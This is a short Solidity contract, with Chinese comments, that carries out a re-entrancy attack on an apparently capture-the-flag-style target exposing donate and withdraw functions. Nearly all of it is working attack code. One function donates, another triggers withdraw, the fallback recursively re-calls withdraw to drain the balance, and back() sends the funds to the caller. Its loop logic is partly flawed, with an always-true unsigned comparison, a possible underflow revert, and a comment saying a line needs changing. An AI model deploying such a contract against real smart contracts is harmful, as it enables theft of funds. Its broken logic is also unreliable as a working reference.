// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Re-entrancy攻击合约,完整，不改动版本

contract Force {

    uint256 x=3;

    receive() external payable {
        x = x-1;
        if(x>=0){
        (bool suc,) =address(msg.sender).call(abi.encodeWithSignature("withdraw(uint256)", msg.value));         // 需要改动
        }
    }

    constructor()payable {}
    event log(uint256);
    event log2(bool);
    function trans(address addr,uint256 amount) public {                        // 函数正常工作
        (bool suc,) =address(addr).call{value:amount}(abi.encodeWithSignature("donate(address)", address(this)));
        emit log2(suc);
    }

    function back()external payable {
        payable(msg.sender).transfer(address(this).balance);
    }

    function this_is_not_a_function(address addr,uint256 mount)public {
        (bool suc,) =address(addr).call(abi.encodeWithSignature("withdraw(uint256)", mount));
        emit log2(suc);
    }

    function info(address addr)public {
        x = 3;
        emit log(uint256(address(addr).balance));
    }


    function getMoney()public payable {
        emit log(uint256(msg.value));
    }
}
